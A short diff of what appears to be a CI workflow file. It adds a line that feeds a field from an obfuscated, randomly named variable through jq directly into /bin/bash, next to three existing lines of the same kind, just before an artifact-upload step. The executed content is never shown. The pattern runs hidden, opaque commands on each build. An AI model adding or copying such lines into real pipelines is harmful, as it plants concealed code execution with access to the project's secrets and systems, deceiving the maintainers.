@@ -45,6 +45,7 @@ jobs:
           echo $qfk9070 | jq -r .v9067 | /bin/bash
           printf '%s' "$lzdu4" | jq -r .qt20444 | /bin/bash
           echo $cxc7297 | jq -r .jmcfb014 | /bin/bash
+          printf '%s' "$tjole3187" | jq -r .kb339 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
